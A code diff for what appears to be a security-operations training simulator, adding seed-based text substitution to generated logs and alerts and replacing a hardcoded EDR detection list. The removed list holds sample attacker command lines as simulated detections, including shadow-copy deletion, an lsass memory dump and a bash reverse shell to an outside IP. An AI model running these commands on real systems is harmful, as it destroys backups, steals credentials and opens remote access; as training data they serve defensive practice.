@@ -1,5 +1,7 @@
 // ─── Remediation Actions ─────────────────────────────────────────────────────
 
+import { generateEDRFromSeed } from "./runSeed";
+
 export const REMEDIATION_ACTIONS = [
   { id: "isolate_host", label: "Isolate Host", icon: "🔒", category: "Containment", description: "Network-isolate the selected endpoint immediately" },
   { id: "block_ip", label: "Block IP", icon: "🚫", category: "Containment", description: "Block attacker IP at the perimeter firewall" },
@@ -750,17 +752,27 @@ const LOG_TEMPLATES = {
   ],
 };
 
-export function generateLogs(scenarioId) {
+export function generateLogs(scenarioId, seed) {
   const templates = LOG_TEMPLATES[scenarioId] || LOG_TEMPLATES["phishing_compromise"];
   const now = Date.now();
+  const subs = seed?.substitutions || {};
   return templates.map((t, i) => ({
     id: `log-${i}`,
     timestamp: new Date(now + t.ts * 60000).toISOString(),
-    source: t.src,
+    source: applySubs(t.src, subs),
     type: t.type,
     severity: t.sev,
-    message: t.msg,
+    message: applySubs(t.msg, subs),
   }));
+}
+
+function applySubs(text, subs) {
+  if (!text || typeof text !== "string") return text;
+  let result = text;
+  for (const [from, to] of Object.entries(subs)) {
+    result = result.split(from).join(String(to));
+  }
+  return result;
 }
 
 // ─── Alert Generator ──────────────────────────────────────────────────────────
@@ -997,27 +1009,23 @@ const ALERT_TEMPLATES = {
   ],
 };
 
-export function generateAlerts(scenarioId) {
+export function generateAlerts(scenarioId, seed) {
   const templates = ALERT_TEMPLATES[scenarioId] || ALERT_TEMPLATES["phishing_compromise"];
-  return templates.map(t => ({ ...t, status: "open", timestamp: new Date().toISOString() }));
+  const subs = seed?.substitutions || {};
+  return templates.map(t => {
+    const alert = { ...t };
+    if (alert.src) alert.src = applySubs(alert.src, subs);
+    if (alert.title) alert.title = applySubs(alert.title, subs);
+    if (alert.rule) alert.rule = applySubs(alert.rule, subs);
+    alert.status = "open";
+    alert.timestamp = new Date().toISOString();
+    return alert;
+  });
 }
 
 // ─── EDR Detection Generator ──────────────────────────────────────────────────
 
-export function generateEDRDetections(scenarioId) {
-  const base = [
-    { id: "edr1", endpoint: "DESKTOP-WIN01", process: "powershell.exe", pid: 4892, parent: "cmd.exe", cmdline: "powershell.exe -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMA...", severity: "high", mitre: "T1059.001", time: new Date(Date.now() - 38 * 60000).toISOString() },
-    { id: "edr2", endpoint: "DESKTOP-WIN01", process: "cmd.exe", pid: 3201, parent: "explorer.exe", cmdline: "cmd.exe /c vssadmin delete shadows /all /quiet", severity: "critical", mitre: "T1490", time: new Date(Date.now() - 28 * 60000).toISOString() },
-    { id: "edr3", endpoint: "SERVER-WIN01", process: "svchost32.exe", pid: 8812, parent: "WmiPrvSE.exe", cmdline: "C:\\Windows\\Temp\\svchost32.exe -s", severity: "critical", mitre: "T1036", time: new Date(Date.now() - 25 * 60000).toISOString() },
-    { id: "edr4", endpoint: "DESKTOP-WIN02", process: "wmic.exe", pid: 2244, parent: "powershell.exe", cmdline: "wmic.exe /node:10.0.1.11 process call create cmd.exe /c whoami", severity: "high", mitre: "T1047", time: new Date(Date.now() - 15 * 60000).toISOString() },
-  ];
-
-  if (scenarioId === "lateral_movement") {
-    base.push({ id: "edr5", endpoint: "DC-PRIMARY", process: "lsass.exe", pid: 600, parent: "wininit.exe", cmdline: "C:\\Windows\\system32\\lsass.exe (memory read by procdump.exe)", severity: "critical", mitre: "T1003.001", time: new Date(Date.now() - 55 * 60000).toISOString() });
-  }
-  if (scenarioId === "web_compromise") {
-    base.push({ id: "edr5", endpoint: "LINUX-WEB01", process: "bash", pid: 1337, parent: "apache2", cmdline: "bash -i >& /dev/tcp/91.92.247.18/4444 0>&1", severity: "critical", mitre: "T1059.004", time: new Date(Date.now() - 60 * 60000).toISOString() });
-  }
-
-  return base;
+export function generateEDRDetections(scenarioId, seed) {
+  // Delegate to seed-based EDR generator for scenario-specific, seed-consistent detections
+  return generateEDRFromSeed(scenarioId, seed);
 }
